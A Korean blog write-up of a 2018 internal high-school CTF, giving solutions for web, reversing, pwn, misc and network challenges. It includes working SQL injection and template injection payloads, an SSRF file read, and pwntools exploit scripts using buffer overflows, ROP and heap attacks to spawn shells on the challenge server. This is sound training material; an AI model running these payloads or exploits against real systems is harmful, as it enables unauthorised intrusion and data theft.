---
layout: post
title: "Dimigo MiniCTF 2018 Write-Up"
date: 2018-10-30
excerpt: "어쩌다 말 나와서 1학년  열렸던 내부 CTF Write-Up입니다."
tags: [write-up]
comments: true
---

# Dimigo MiniCTF Write UP

## Web

### What is SQLi? (50)

' or 1=1#

기본적인 sqli 구문이다.



__플래그 : TRUST{' or '1=1-- -}__



### Click me (100)

현재 스테이지 정보를 stage라는 쿠키에 저장한다. 쿠키값 조작하고 새로고침하면 플래그를 볼 수 있다.



__플래그 : flag{c000000kie_i5_danger==delicious}__



### JS (125)

난독화된 main.js를 볼 수 있는데, 일단 적당히 사이트로 일정 이상 난독화 해제 한 뒤 분석했다.

함수 이름이나 변수 이름을 죄다 16진수로 바꿔서 읽기도 힘들고 코드도 로직이 말도 안돼서

이건 코드 읽는게 아니구나 싶었다.



맨 위에 

```javascript
var _0x3e8a = ["aXpHaHM=", "SVVBdVU=", "ZmtacFM=", "RmxhZz8g", "c2xpY2U=", "RmxhZyA6IA==", "V3JvbmcuLi4=", "cmVsb2Fk", "bF9qNHZhNWM=", "TkpWakE=", "cmlwdF8wYmY=", "dXNjNHRpMG4=", "VlN0YXk=", "X0g0aDRoYX0=", "b0lBYVo=", "alFjZ0E=", "cVJiakg=", "UlBtUkc=", "YUlIQ0g=", "bkZOZ2Q=", "c3BoYmo=", "Z0taSUU=", "alBES0M=", "ZFluVms=", "dkVpbUw=", "dnJycno=", "eU15eUU=", "R2R4cXI="];
```

이런 배열 볼 수 있는데, 파이썬으로 decode 돌리면

```
izGhs
IUAuU
fkZpS
Flag? 
slice
Flag : 
Wrong...
reload
l_j4va5c
NJVjA
ript_0bf
usc4ti0n
VStay
_H4h4ha}
oIAaZ
jQcgA
qRbjH
RPmRG
aIHCH
nFNgd
sphbj
gKZIE
jPDKC
dYnVk
vEimL
vrrrz
yMyyE
Gdxqr
```

이렇게 나온다.  main.js 본문에 나온 flag{H3l이랑 적당히 골라서 합치면 플래그 나온다.



__플래그 : flag{H3ll_j4va5cript_0bfusc4ti0n_H4h4ha}__



야매로 풀은 듯



### Basic SQLi (150)

`select * from user where id= '{$_GET['id']}' and pw = '{$_GET['pw']}'`

위와 같은 query로 로그인에 성공하면 플래그를 준다.

싱글 쿼터, or, = 등 필터링이 걸려있기 때문에 id에 \를 넣어 이스케이프 한 뒤

pw에 **\|\| 1 like 1#** 로 공격했다.



__플래그 : flag{sqli_b4sic}__



### Tetris2

github에서 퍼온 테트리스 게임이다. 게임 오버시 이름을 기입하고 랭킹 페이지로 넘어가는데

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://test.c2w2m2.com/tetris/score/", true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = () => {
    if(xhr.readyState == 4 && xhr.status == 200) {
        console.log('success')
    }
}

xhr.send('name=' + name + '&score=' + scoreText)
```

디버깅 기능으로 마지막 줄에 bp걸고 scoreText 조작한 다음 continue하면 플래그 뜬다.

점수 최대 8자인거 모르고 9999999999999 같은거 박다가 안 풀려서 개빡쳤었다.



__플래그 : flag{Just_do_hijack}__



### Bypass it (200)

```php
<?php
    if(isset($_GET['a']) && isset($_GET['b'])){
    
        include './flag.php'; // Flag in here
        $a = $_GET['a'];
        $b = $_GET['b'];

        if(!is_numeric ($b)){
            die("Plz int");
        }

        if(substr($a,$b) === sha1($a)){
            echo '<h1>'.$flag.'<h1><hr>';
        }else{
            echo 'Nop~<hr>';
        }
    }
?>
```

GET으로 a와 b를 받은 뒤 a에서 b만큼 자른 것이 a를 sha1 해시화한 값과 

엄격한 비교를 하여 같으면 플래그를 출력한다.



hack.lu CTF 2018의 Baby PHP 문제에서 나온 type confusion 문제이다.

간단하게 a가 아니라 a[]로 보내면 둘 다 NULL이 나와 bypass가 가능하다.



__플래그 : flag{Return_Null===Null}__



### frss (200)

문제 이름이 ssrf를 뒤집은 frss이다.

GET으로 url을 받고 url에 request를 보내는데, 이를 이용해 localhost의 파일을 읽을 수 있다.

나는 ```file://../../../../var/www/html/frss/flag``` 로 읽었고,

출제자 의도는 ```file:///proc/self/cwd/flag``` 이라고 한다.



### Ti (250)

**Server Side Template Injection**이 발생하며 단순하게 \{\{config\}\} 로 플래그를 읽는 것이 가능하다.

..... RINT_REGULAR': False, 'TESTING': False, 'flag': 'flag{SSSSSTI}', 'PERMANENT_SESSION_LIFETIME .....



__플래그 : flag{SSSSSTI}__



### SQQQQQQLLLLLLLLLlll (250)

일단 공백 필터링은 /**/로 우회할 수 있고, id만 출력하는데 pw as id로 이를 바꿀 수 있다.

union sql injection + order by로 id가 flag인 것을 알아내고 비밀번호 읽으면 된다.

id는 이전 문제처럼 이스케이프 처리했고 pw는 아래처럼 했다.

```
union/**/select/**/pw/**/as/**/id,1/**/from/**/user/**/order/**/by/**/1#
```



__플래그 : flag{uni0n0n0n0nnnnnnn}__



### guestbook (250)

글 인덱싱할 때 ```?no=1 union select```  식으로 union sqli가 가능해서 table, column명 따고 플래그 읽을 수 있다.



```
http://test.c2w2m2.com/guestbook/read.php?no=25%20union%20select%20table_name%20from%20information_schema.tables;#
```

table : fl4g_flag_flag

```
http://test.c2w2m2.com/guestbook/read.php?no=25%20union%20select%20column_name%20from%20information_schema.columns;#
```

column : flag_hida

```
http://test.c2w2m2.com/guestbook/read.php?no=25%20union%20select%201,%202,%20flag_hida,%204,%205%20from%20fl4g_flag_flag;#
```



**플래그 : flag{f1ag_uni0n_based_sqli_hahahahahaha}**



### Advance sqlinjection (300)

알파벳, 숫자가 preg_match로 막혀있는데 특수기호로만 이렇게 저렇게 True  되게하면 된다.

``` select * from user where id='\' and pw='|| !('@' ^ '@')#' ```

이모티콘 같다



**플래그 : flag{advance_sqlinjection_haha}**



## Rev

### WTF (50)

단순하게 함수 이름이 flag_is_0h_y0u_f0und_m3다.



__플래그 : 0h_y0u_f0und_m3__



### C obfuscation (100)

난독화된 C 코드가 있는데 text replace로 적당히 푼 다음 역연산 해주면 된다.



**플래그 : flag{C_obfuscation_obfusction_C}**


### Slicer (100)

IDA로 디컴파일하면 올바른 입력값을 알 수 있다.

**플래그 : e45YyYyyyY_r3v3r5inggggg**


### Nostradamus (125)

srand(0x1337)로 시드 고정이어서 값이 매번 일정하다.

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	srand(0x1337);
	for (int i=1; i<=20; i++)
	{
		printf("%d\n", rand());
	}
	return 0;
}
```

이런 코드 짜고서 파이프로 넘겨주면 플래그 획득 가능하다.

```
Can you guess my number 20 times? Here you go!

Stage 1 : Stage 2 : Stage 3 : Stage 4 : Stage 5 : Stage 6 : Stage 7 : Stage 8 : Stage 9 : Stage 10 : Stage 11 : Stage 12 : Stage 13 : Stage 14 : Stage 15 : Stage 16 : Stage 17 : Stage 18 : Stage 19 : Stage 20 : Nice Job! Get your flag.

flag{guessssssss555ssssking}
```



**플래그 : flag{guessssssss555ssssking}**



### Alyac (150)

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int i; // [rsp+14h] [rbp-7Ch]
  char v5[104]; // [rsp+20h] [rbp-70h]
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  printf("Your Input : ", a2, a3, a2);
  __isoc99_scanf("%32s", v5);
  for ( i = 0; i <= 31; ++i )
  {
    if ( i > 9 )
    {
      if ( i > 19 )
      {
        if ( i <= 31 && v5[i] != byte_601100[10 * (i - 20)] )
          sub_400686();
      }
      else if ( v5[i] != byte_601080[5 * (i - 10)] )
      {
        sub_400686();
      }
    }
    else if ( v5[i] != aFdzcxzraldoryh[8 * i] )
    {
      sub_400686();
    }
  }
  printf("Flag : %s\n", v5);
  return 0LL;
}
```

위와 같은 과정으로 데이터 체크를 하는데 간단하게 역연산 해주면 된다.

IDA에서는 문자열이 좀 깨지게 나오는데 gdb로 하던 어떻게 하던 적당히 맞춰주자.



solve.py

```python
a = "fDzCXzralDOrYhHPaDfMJtuagAmGExJr{YlMEPhXaKVSugUElCWlVYPnyKYpIgbzaiLRvlNlcmvEtjer"
b = "_zgDMsCaXWtcTFYaalfFtcKpmiqEqScmXXy_sdXpkNKISeuRcY"
c = "yZauoqXOhM_JeoAXlavDbKhkmzxQXGuohSpuJMWHgtZfLowBDtbPCrxnYlGgoWyUCblHWjuXmfpZGrJsnMnHPDauIwtaXYBakboCyRvolMPkSO}YhhBKHDMW"

flag = ''

for i in range(0, 10):
    flag += a[8 * i]

for i in range(10, 20):
    flag += b[5 * (i - 10)]

for i in range(20, 32):
    flag += c[10 * (i - 20)]

print flag
```



__플래그 : flag{alyac_static_key_bugbounty}__

주창이형 기분이 많이 좋은 것 같다.



## Pwn

### First Step (70)

A 쭉 박아서 버퍼 넘기면 플래그 준다.



__플래그 : flag{b0f_bof_bof_ffff_____}__



### NoBoF (100)

입력할 글자수 입력받는데 unsigned int형이어서 음수 박으면 쓰레기값 되서 BOF 가능하다.

```python
from pwn import *

p = remote('c2w2m2.com', 6665)

p.recv()
p.sendline('-9999999999999999999999999999999999')
p.recv()

payload = 'A' * 268 
payload += p32(0x080485b5)

p.sendline(payload)
p.interactive()
```



__플래그 : flag{int=>unsigned_is_danger}__



### babyuba (150)

1. malloc(500)
2. free()
3. Edit
4. check

와 같이 메뉴가 구성되어 있는데, check시 bss에 0으로 초기화된 전역 변수의 값을 바꾸면 쉘을 띄워준다.

malloc size가 500이므로 small bin이 할당되는데 Edit시 해당 index의 chunk가 free 상태인지 검사하지 않고 

​	값을 쓸 수 있게 해줘 fd와 bk가 조작 가능하다. 

따라서 unsorted bin attack으로 값을 main_arena+88로 바꿔주면 된다.



exp.py

```python
from pwn import *

p = remote('c2w2m2.com', 4766)
#p = process('./babyuba')

p.recvuntil('It is on 0x')
check = int(p.recv(6), 16) - 0x10

payload = p64(0) + p64(check)

p.recv()
p.sendline('1')

p.recv()
p.sendline('1')

p.recv()
p.sendline('2')
p.sendline('0')

p.recv()
p.sendline('3')
p.sendline('0')
p.sendline(payload)

p.recv()
p.sendline('1')

p.recv()
p.sendline('4')

p.interactive()
```



__플래그 : flag{FuckFukc}__



### RPGame (150)

단순히 메뉴를 통해 power 값을 일정 이상 넘기면 BOF를 주는데 간단하게 ROP하면 된다.



exp.py

```python
from pwn import *

p = remote('c2w2m2.com', 4762)

#p = process('./rpggame')

e = ELF('./rpggame')
l = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

bss = e.bss()
binsh = '/bin/sh'
pppr = 0x080488c9
wr_sy = l.symbols['write'] - l.symbols['system']


for i in range(0, 20):
	p.sendline('3')

p.sendline('1')

payload = 'A' * 58

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(write_got)
payload += p32(8)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(8)

payload += p32(write_plt)
payload += 'AAAA'
payload += p32(bss)

p.recv()
sleep(0.3)
p.send(payload)
sleep(0.3)
p.send(binsh)
p.recvuntil('name ? : ')

leak = u32(p.recv(4))

print hexdump(leak)
system = leak - wr_sy

p.send(p32(system))
p.interactive()
```



__플래그 : flag{game_hagoshipda}__



### where is she (150)

내가 출제했다가 망한 문제다.

의도는 fflush 함수가 사용되었기 때문에 .dynstr의 fflu__'sh'__를 이용하는 것이었는데

단순하게 read로 bss에 /bin/sh 쓰고 pppr로 system@plt call하면 되는 것을 생각 못했다. ㅋㅋㅋㅋ



payload

```(python -c 'print "A"*304 + "\xb0\x83\x04\x08" + "AAAA" + "\x96\x82\x04\x08"'; cat) | nc c2w2m2.com 4777```



__플래그 : flag{did_y0u_us3d_dyn57r_0r_ppppr?}__



### Easy~~ (200)

1. Open
2. Read
3. Write
4. Exit

의 메뉴로 이루어져있는데 현재 디렉터리의 파일을 Open으로 읽고 Write로 출력할 수 있다.

Open에서 flag, proc, etc, self을 strstr로 필터링 해놨는데 여기에는 의미가 없고

main 처음에 qword_2021c0에 puts("ByeBye~~")를 넣어놓고 메뉴 선택 잘못했을 때 이거 호출하는데

Read에서 BOF가 터져서 이를 system("/bin/cat flag")하는 sub_CDC() 함수로 덮을 수 있다.

처음에 PIE 걸려서 어떻게 하지 싶었는데 처음에 바로 Write시 특정 코드 주소가 leak된다.

P~~~ 뭐라고 읽을 수 없는 문자 출력되길래 뭔가 싶었는데, libc 같은거 하위 1바이트 고정인 거 같이

P 고정되길래 주소인거 알아채고 오프셋 계산해서 플래그 읽었다.

솔직히 아직 출제 의도는 모르겠다.



exp.py

```python
from pwn import *

#p = process('./easy')
p = remote('c2w2m2.com', 4567)
p.recvuntil(':> ')
p.sendline('3')
p.recv(256)

leak = u64(p.recv(6).ljust(8,'\x00'))
flag = leak - 0x130 + 0x2C7
log.info('/bin/cat flag : ' + str(hex(flag)))

p.recvuntil(':> ')

p.sendline('2')

payload =  p64(flag) * 120

p.sendline(payload)
p.interactive()
```



__플래그 : flag{uninit?N0p~init_is_danger}__



### Bash Jail (200)

head랑 와일드 카드 필터링 안되있길래 head f*로 읽었다ㅋㅋ



**플래그 : flag{s0lve_____________________________________________B4shjail}**



### Reader (200)

```c
signed __int64 Open()
{
  signed __int64 result; // rax
  char file; // [rsp+0h] [rbp-30h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Your Filename?\n:> ");
  scan(&file, 40LL);
  fd = open(&file, 0);
  if ( fd >= 0 )
  {
    if ( filter(&file) )
    {
      puts("Filterd!");
      fd = -1;
      result = 0xFFFFFFFFLL;
    }
    else
    {
      result = 0LL;
    }
  }
  else
  {
    puts("No file..");
    result = 0xFFFFFFFFLL;
  }
  return result;
}
```

Open에서 우선 파일을 연 다음 필터링을 거치기 때문에 파일 디스크립터에는 플래그가 남아있다.

1. Open(flag)
2. Open(/proc/self/fd/3)
3. Read()
4. Write()



__플래그 : flag{s0lve_reader_/proc/self/fd}__



### attack (400)

```c
signal(6, (__sighandler_t)handler);
```

```c
void __noreturn handler()
{
  puts("Time out!");
  puts("But... You can get shell XD");
  system("/bin/sh");
  exit(1);
}
```

signal 6(SIGABRT)이 뜨면 쉘이 따진다. 

```c
if ( SHIDWORD(qword_6020E0[2 * i + 1]) > 300 || SHIDWORD(qword_6020E0[2 * i + 1]) <= 199 )
  {
    puts("Over size");
    exit(-1);
  }
```

malloc을 199 초과 300 이하로 할 수 있으므로 smallbin만 할당할 수 있음을 알 수 있다.

우선 취약점은 chunk가 free 상태인지 확인하지 않고 edit 및 view가 가능하다는 점인데,

아직 부족한 실력으로 생각나는게 unsorted bin attack 밖에 없어서 특정 변수에 main_arena+88의 값을 덮는 것이 공격 루트라고 생각했고, 이를 어떻게 이용하면 signal 6을 띄울 수 있을지 생각해봤다.



결국 생각한 방법은 main_arena+88를 leak할 수 있으므로 unsorted bin attack으로 main_arena+88에 

main_arena+88을 덮으면 top chunk를 가르키는 포인터가 이상해져 malloc corruption이 일어나는 루트였다.

malloc을 smallbin 크기로 2개 정도 해주고 (병합 방지), 하나를 free 한 뒤 view로 main_arena+88을 leak하고

edit으로 bk를 main_arena+88 - 0x10으로 바꾸어서 공격이 가능했다.



exp.py

```python
rom pwn import *

p = remote('c2w2m2.com', 1999)

def alloc(data):
	p.recvuntil(':> ')
	p.sendline('1')
	p.recvuntil(':> ')
	p.sendline('256')
	p.recvuntil(':> ')
	p.sendline(data)

def free(idx):
	p.recvuntil(':> ')
	p.sendline('2')
	p.recvuntil(':> ')
	p.sendline(str(idx))

def edit(idx, data):
	p.recvuntil(':> ')
	p.sendline('3')
	p.recvuntil(':> ')
	p.sendline(str(idx))
	p.recvuntil(':> ')
	p.sendline(data)
	
def view(idx):
	p.recvuntil(':> ')
	p.sendline('4')
	p.recvuntil(':> ')
	p.sendline(str(idx))


alloc('A' * 20)
alloc('B' * 20)
alloc('C' * 20)

free(1)

view(1)

p.recvuntil('-+')
p.recv(0x7c)

leak = u64(p.recv(6).ljust(8,'\x00'))
log.info('MAIN_ARENA+88 : ' + hex(leak))

payload = p64(leak) + p64(leak - 0x10)

edit(1, payload)

alloc('D' * 20)
p.recv()
p.sendline('1')
sleep(0.3)
p.sendline('256')

p.interactive()
```





## Misc

### Harder Mic Check (10)

caesar cipher이다.



**플래그 : flag{easy_as_mic_check_right}**



### 여기 짱이 누구야? (10)

이주창의 인지도를 넓히기 위한 문제



**플래그 : flag{이주창}**



### ZIPinZIP (50)

zip 파일 두 개를 만들어놓고 하나의 hex값을 나머지 한 개의 hex값 뒤에 붙여넣었다. 적당히 잘라주면 된다.



**플래그 : flag{hidd3n_zip}**



### Can't Even Read (50)

PNG 파일이므로 확장자 바꿔주면 나오는 qr code 인식해주면 플래그 링크가 나온다.



**플래그 : flag{y0u_h4v3_w0nd3rfu1_3y3s}**


### 아빠 (60)

a = 0, b = 1로 치환한 뒤 binary to text 돌려주면 된다.

**플래그 : flag{abba_himnaesaeyo}**


### base2048 (75)

2048 = 64 * 32 라고 문제에서 적어줬다. base64 encode를 32번 한 것으로 생각하고 import base64로 슥삭

하면 되지만 귀찮아서 webhacking.kr 유틸로 했다.



**플래그 : flag{b4se64_for_i_in_range_(0,32)}**



### dummy (75)

200mb 짜리 말도 안되는 텍스트 파일이 있는데 받아서 몇 백개로 쪼개고 sha1 값 다른거 뽑고 또 쪼개고 뽑고..

이거 반복하다가 나왔다.

```
AAAAAAAAAAAAAAAAAAAAAAAflag{dummy_dummy_dumm}AAAAAAAAAAAAAAAAAAA
```



__플래그 : flag{dummy_dummy_dumm}__



### Not easy mic check (100)

어려운 mic check다.



__플래그 : flag{Fucking_flag}__



### Hide PDF (100)

헥스 값 마지막에 플래그가 있다.

```
.......0116249 00000 n .trailer.<<./Size 321./Info 320 0 R./Root 317 0 R./Prev 109351.>>.startxref.116430.%%EOF.flag{pdf_can_do_it_XD}
```



__플래그 : flag{pdf_can_do_it_XD}__



### TMI (100)

fake flag 수백 개에 real flag 하나 있는데 착하게 파일 크기를 다르게 해놔서 크기 정렬하면 된다.



**플래그 : flag{real_one}**



### Dynamic Interrogate Flag Forwarding (110)

몇 글자씩 다른 텍스트 파일 두개 주는데 온라인 diffing 툴로 찾으면 슥삭이다.



**플래그 : flag{how_did_you_diff?}**



### MissingNo (120)

제 18회 해킹캠프 때 나온 문제다. 파이썬으로 모두 더한 뒤 총합에서 빼면 된다.

```python
with open ("lost_number.txt", "r") as myfile:
    data=myfile.readlines()
 
a = data[0]
a = a.split(' ')
 
sum_lost = 0
sum_real = 0
 
for i in range(0, len(a)):
    sum_lost += int(a[i])
 
for i in range(1, 1000000):
    sum_real += i
 
answer = sum_real - sum_lost
 
print answer
```



**플래그  : flag{16e15bd30f2a3e2a8dc25bef80516e09}**



### Tetris1 (125)

깃으로 개발했다길래 git dumper로 http://test.c2w2m2.com/tetris/.git 땄다.

```
./git-dumper.py http://test.c2w2m2.com/tetris/.git test
```

```
pwn@trust  ~/git-dumper/test   master  cat README.md 
# flag{.git_must_be_hide_XD...}
```



**플래그 : flag{.git_must_be_hide_XD...}**



### Paint 3DD (150)

살면서 접해본 문제 중에 Ka Diana 다음으로 더러웠던 문제다.

그림판 3D에 프로젝트 대충 만들고 
```
%localappdata%\Packages\Microsoft.MSPaint_8wekyb3d8bbwe\LocalState\Projects
```

에서 파일 복붙하는 것까진 쉬운데 도형 돌려도 플래그 안 나온다.

그런데 도형 그룹 해제하면 플래그가 나온다..



__플래그 : flag{Paint_3D_XD}__



### Advance Clickme (150)

처음에 1조번 클릭해야 되길래 이건 분명히 트릭이 있다고 생각해서 삽질했는데 출제자가 1만개로 수정했다.

진짜 request 1만번 하는 것으로 생각하고 curl 이용해서 풀었다.

```bash
while true;do
curl -b "PHPSESSID=********************" http://test.c2w2m2.com/advance_clickme/
done
```



**플래그 : flag{make_automatical_tooooo00ooll}**


### Nostradamus Revenge (150)

랜덤 시드를 주고 랜덤값을 맞춰야 한다. 시드가 매번 달라지는데 libc 주었으니 import ctypes해서 맞춰주면 된다.

```python
from pwn import *
from ctypes import *

#p = process('./revenge')
#c = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
c = CDLL("./libc.so.6")
p = remote('c2w2m2.com', 5700)

for i in range(0, 2000):
	p.recvuntil('Seed : ')

	seed = int(p.recvline())
	c.srand(seed)
	
	guess= c.rand()
	print 'Stage ' + str(i+1)
	print 'Seed : ' + str(seed) + '// Answer : ' + str(guess)
	p.sendline(str(guess))

p.interactive()
print p.recv()
```

**플래그 : flag{12312qweqwe}**


### travel (175)

파일이 오지게 많은데 grep -r 하면 recursive grep 이어서 플래그 찾아준다.

```bash
~/trust/bak/travel st4n@ubuntu
❯ grep -r flag
Binary file travel.zip matches
SGXXIhIshy:flag{zip_travel}
```



**플래그 : flag{zip_travel}**



### Easy Calc (175)

사칙연산 문제를 1초 안에 1000개 맞춰야 한다. python eval()로 쉽게 짤 수 있다.

```python
from pwn import *

p = remote('c2w2m2.com', 5678)

stage = 1

while 1:
	if stage == 1001:
		p.interactive()

	print ('STAGE ' + str(stage))
	stage += 1

	p.recvuntil(']-------------------------')
	ask = p.recvuntil('=')
	ask = ask[:-2]
	print (ask + '=' + str(eval(ask)))
	p.sendline(str(eval(ask)))
```



__플래그 : flag{automatic_eval_calc_GG}__



### Casino (200)

BOB CTF에서 나왔다는 문제인데, 푸는 방법이 여러가지 있다.

1. Python None Trick
2. Fork 했으므로 random seed가 일정한 것 이용



나같은 경우는 2번으로 풀었고 pwntools로 서버 열고 닫고 해서 대강 계산해서 23번 째까지 정답을 알아냈다.

guess.py

```python
from pwn import *

query = []

for i in range(1, 25):
    for j in range(1, 7):
        
        p = remote('c2w2m2.com', 1995)
        
        for k in range(0, len(query)):
            p.recvuntil('1~6:')
            p.sendline(str(query[k]))
            p.recvuntil('bet:')
            p.sendline('1')
            p.recvuntil('rich!')
        
        p.recvuntil('1~6:')
        p.sendline(str(j))
        p.recvuntil('bet:')
        p.sendline('1')
        res = p.recvuntil('rich!')
        print res
        if 'win' in res:
            query.append(j)
            print 'FOUND No.' + str(i) + ': ' + str(j)
            break
        else:
            print 'No.' + str(i) + ': ' + str(j) + '-------- (X)'
        p.close()
print query
```

 위 코드의 결과를 바탕으로 약 14번 게임을 거치면 플래그를 얻을 수 있다.

flag.py

```python
from pwn import *

p = remote('c2w2m2.com', 1995)

answer = "3 6 1 1 2 6 1 3 3 5 5 5 1 6 3 1 5 3 1 4 6 1 5"
answer = answer.split(' ')

for i in range(0, len(answer)):
	p.recvuntil('You have $')
	money = p.recvuntil('00.')
	money = money[:-1]
	print 'CURRENT MONEY : ' + money + '$'

	p.recvuntil('1~6: ')
	p.sendline(str(answer[i]))
	p.recvuntil('bet: ')
	
	if i==13:	
		p.interactive()
	
p.sendline(money)
```

P.S. 이거 플래그 나오면 서버 바로 닫혀서 EOF 뜨길래 그냥 interactive 했다.



**플래그 : flag{Welc0me_to_casino~}**


## Network

### Basic Network (60)

File -> Export Objects -> HTTP로 파일 추출하면 플래그가 사진으로 나와있다.

**플래그 : flag{Wireshark_i5_so_scray}**

### Netnya (100)

172.16.0.155에서 108.61.127.142(c2w2m2.com)의 11234 포트로 연결을 시도한 패킷을 볼 수 있다.
nc c2w2m2.com 11234로 연결하자 입력값을 입력할 수 있었고, AAA를 입력하면 NoNo...가 출력되었다.
어떤 입력값을 넣어야 할지 고민하다가 패킷에서 "I want to get flag_flag_FLLLLLLLLLG."을 c2w2m2.com으로 보낸 프레임을 봐서
그대로 넣어주었더니 플래그를 얻을 수 있었다.

**플래그 : flag{socket_server_is_hacker's_default}**


## Guessing

### Guessing 1 (1)

```
플래그는 guess{내용} 으로 제출해주세요.
```

라고 했으므로



**플래그 : guess{내용}**



### Guessing 2 (2)

```
이 문제는 플래그가 없거든요
```

라고 했으므로



**플래그 : 없거든요**



### Guessing 3 (3)

```
이번엔 플래그 진짜 없습니다.
```

라고 했으므로



**플래그 : **



### Guessing Final (4)

```
플래그는 1 이상 1000이하 자연수입니다.

```

라고 했으므로



**플래그 : 1 이상 1000이하 자연수입니다.**

